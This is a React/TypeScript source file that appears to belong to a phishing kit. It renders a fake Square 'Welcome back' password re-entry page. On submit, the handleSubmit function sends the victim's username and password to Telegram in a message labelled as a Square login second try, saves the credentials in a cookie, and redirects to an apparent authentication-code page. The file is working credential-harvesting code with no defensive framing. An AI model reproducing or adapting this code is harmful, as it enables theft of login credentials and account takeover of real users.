import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { Link } from "react-router-dom";

export default function ReLoginPass() {
const username = cookies.get("username2");
  const [formInput, setFormInput] = useState<Login2>({
    username2: username,
    password2: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 SQUARE LOGIN (SECOND TRY) 🏦+-----]
  
    USERNAME: ${formInput.username2}

    PASSWORD: ${formInput.password2}
    `;
    
    await TelegramSend(message)
    cookies.set("login2", formInput)
    setIsLoading(false)
    navigate("../login/auth", {replace:true})
    
}
  return (
    <div className="middle-form">
      <div className="submitForm">
       
       <h3>Welcome back.</h3>
       <p>{username} <span className="nav2"> <Link style={{fontWeight:"normal"}} to="/re-login">Change</Link></span></p>
        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
           
            <input minLength={6}  placeholder="Password" onChange={handleInputChange} required name="password2" type="password" />
          </div>
          
          <div className="nav2" style={{marginBottom:"20px"}}><Link to={""}>Forgot password?</Link></div>

          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Sign in
        </button>}
        </form>

        
     
      </div>
      </div>
  );
}
